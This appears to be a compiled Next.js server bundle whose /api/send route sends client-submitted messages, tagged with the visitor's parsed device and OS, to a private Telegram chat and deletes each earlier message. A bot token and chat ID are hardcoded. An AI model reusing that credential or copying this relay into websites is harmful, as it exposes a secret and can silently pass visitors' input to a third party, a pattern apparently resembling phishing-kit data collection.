module.exports = [
"[externals]/next/dist/compiled/next-server/app-route-turbo.runtime.dev.js [external] (next/dist/compiled/next-server/app-route-turbo.runtime.dev.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/next-server/app-route-turbo.runtime.dev.js", () => require("next/dist/compiled/next-server/app-route-turbo.runtime.dev.js"));

module.exports = mod;
}),
"[externals]/next/dist/compiled/@opentelemetry/api [external] (next/dist/compiled/@opentelemetry/api, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/@opentelemetry/api", () => require("next/dist/compiled/@opentelemetry/api"));

module.exports = mod;
}),
"[externals]/next/dist/compiled/next-server/app-page-turbo.runtime.dev.js [external] (next/dist/compiled/next-server/app-page-turbo.runtime.dev.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/compiled/next-server/app-page-turbo.runtime.dev.js", () => require("next/dist/compiled/next-server/app-page-turbo.runtime.dev.js"));

module.exports = mod;
}),
"[externals]/next/dist/server/app-render/work-unit-async-storage.external.js [external] (next/dist/server/app-render/work-unit-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/work-unit-async-storage.external.js", () => require("next/dist/server/app-render/work-unit-async-storage.external.js"));

module.exports = mod;
}),
"[externals]/next/dist/server/app-render/work-async-storage.external.js [external] (next/dist/server/app-render/work-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/work-async-storage.external.js", () => require("next/dist/server/app-render/work-async-storage.external.js"));

module.exports = mod;
}),
"[externals]/next/dist/shared/lib/no-fallback-error.external.js [external] (next/dist/shared/lib/no-fallback-error.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/shared/lib/no-fallback-error.external.js", () => require("next/dist/shared/lib/no-fallback-error.external.js"));

module.exports = mod;
}),
"[externals]/next/dist/server/app-render/after-task-async-storage.external.js [external] (next/dist/server/app-render/after-task-async-storage.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/server/app-render/after-task-async-storage.external.js", () => require("next/dist/server/app-render/after-task-async-storage.external.js"));

module.exports = mod;
}),
"[project]/src/app/api/send/route.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "POST",
    ()=>POST
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/.pnpm/next@16.0.10_@babel+core@7._5cc6f5c90c49b93e33883c7b7dd1b8ab/node_modules/next/server.js [app-route] (ecmascript)");
var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$ua$2d$parser$2d$js$40$2$2e$0$2e$9$2f$node_modules$2f$ua$2d$parser$2d$js$2f$src$2f$main$2f$ua$2d$parser$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/.pnpm/ua-parser-js@2.0.9/node_modules/ua-parser-js/src/main/ua-parser.mjs [app-route] (ecmascript)");
;
;
const getConfig = async ()=>{
    const config = {
        TOKEN: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
        CHAT_ID: 7211586401
    };
    if (!config.TOKEN || !config.CHAT_ID) {
        throw new Error("Missing TOKEN or CHAT_ID in environment variables");
    }
    return config;
};
const POST = async (req)=>{
    try {
        const body = await req.json();
        const { message, message_id } = body;
        if (!message) {
            return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
                success: false
            }, {
                status: 400
            });
        }
        const config = await getConfig();
        const { TOKEN, CHAT_ID } = config;
        if (!TOKEN || !CHAT_ID) {
            return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
                success: false,
                message: 'Missing TOKEN or CHAT_ID in config'
            }, {
                status: 500
            });
        }
        const ua = req.headers.get('user-agent') || '';
        const parser = new __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$ua$2d$parser$2d$js$40$2$2e$0$2e$9$2f$node_modules$2f$ua$2d$parser$2d$js$2f$src$2f$main$2f$ua$2d$parser$2e$mjs__$5b$app$2d$route$5d$__$28$ecmascript$29$__["UAParser"](ua);
        const uaResult = parser.getResult();
        const deviceType = uaResult.device.type || 'desktop';
        const deviceVendor = uaResult.device.vendor || 'Unknown';
        const deviceModel = uaResult.device.model || 'Unknown';
        const osName = uaResult.os.name || 'Unknown';
        const osVersion = uaResult.os.version || 'Unknown';
        const deviceName = [
            deviceVendor,
            deviceModel
        ].filter((item)=>item && item !== 'Unknown').join(' ');
        const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
        const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
        const deviceInfo = `${finalDeviceName} | ${osLabel}`;
        const messageWithDeviceInfo = message.includes('__DEVICE_INFO__') ? message.replace('__DEVICE_INFO__', deviceInfo) : message;
        // Gửi tin nhắn mới trước
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageWithDeviceInfo,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) {
            return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
                success: false
            }, {
                status: 500
            });
        }
        const data = await response.json();
        const newMessageId = data?.result?.message_id ?? null;
        // Chỉ xóa tin cũ sau khi gửi tin mới thành công
        if (message_id) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: message_id
                })
            });
        }
        return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
            success: true,
            message_id: newMessageId
        });
    } catch  {
        return __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f2e$pnpm$2f$next$40$16$2e$0$2e$10_$40$babel$2b$core$40$7$2e$_5cc6f5c90c49b93e33883c7b7dd1b8ab$2f$node_modules$2f$next$2f$server$2e$js__$5b$app$2d$route$5d$__$28$ecmascript$29$__["NextResponse"].json({
            success: false
        }, {
            status: 500
        });
    }
};
;
}),
];

//# sourceMappingURL=%5Broot-of-the-server%5D__e1909a24._.js.map